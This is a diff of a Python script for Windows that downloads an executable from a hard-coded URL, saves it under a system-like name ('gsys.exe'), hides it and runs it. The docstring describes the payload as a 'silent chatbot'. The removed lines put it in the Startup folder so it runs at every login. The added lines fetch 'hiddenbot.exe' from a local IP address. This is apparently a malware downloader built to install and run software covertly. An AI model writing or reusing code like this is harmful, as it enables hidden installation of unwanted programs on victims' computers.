@@ -5,6 +5,9 @@ import win32con
 
 from win32com.shell import shell
 
+CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
+global chatboturl
+
 def download_install_run(url, specialpath, fname):
     #Get a path for the file and unhide it.
     path = file_in_special_path(specialpath, fname)
@@ -63,10 +66,7 @@ def __file_setstate(path, state):
 
 def main():
     """Download the silent chatbot and run it."""
-    download_install_run(
-        "http://littlesitetomakemoney.appspot.com/launcher.exe",
-        shellcon.CSIDL_STARTUP,
-        "gsys.exe")
+    download_install_run(CHATBOTURL, shellcon.CSIDL_MYPICTURES, "gsys.exe")
     
 if __name__ == "__main__":
     main()
